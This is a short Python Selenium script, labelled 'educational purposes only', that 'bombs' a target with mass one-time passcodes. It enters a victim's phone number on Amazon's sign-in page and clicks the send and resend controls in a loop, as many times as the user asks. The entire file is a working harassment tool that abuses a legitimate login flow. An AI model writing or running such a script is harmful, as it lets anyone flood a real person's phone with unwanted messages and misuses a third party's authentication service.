#Note: Use for educational purposes only
#Bomb someone with mass OTPs

# Note here instead of a message we are going to bomb using lots of OTPs....
# for this we can use AMAZON website which send OTP to given phone number for logging.
# we are going to fill with target's phone number and automate this whole process
# Amazon updates it website regularly update code to match required changes


from selenium import webdriver

#open web browser
path_to_chromedriver_exe_file = "C:\\Users\\acer\\Downloads\\chromedriver_win32\\chromedriver.exe"
browser = webdriver.Chrome(path_to_chromedriver_exe_file)

#open Amazon website sign in page 
browser.get('https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fsign%2Fs%3Fk%3Dsign%2Bin%26ref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&')

#finding the login element
login_element = browser.find_element_by_id('ap_email')  
#taking user input
phone_number = input("Please enter target's phone number: ")
count = int(input("input number of messages: "))

#filling the values 
login_element.send_keys(phone_number)

#click continue 
cont = browser.find_element_by_id('continue')  
cont.click()

sendOTP = browser.find_element_by_id('continue')  
sendOTP.click()

count -= 1 #as already send 1 time ..now we need to click resend OTP so use loop

for i in range(count):
    sendOTP = browser.find_element_by_id('Resend OTP')  
    sendOTP.click()

browser.quit()

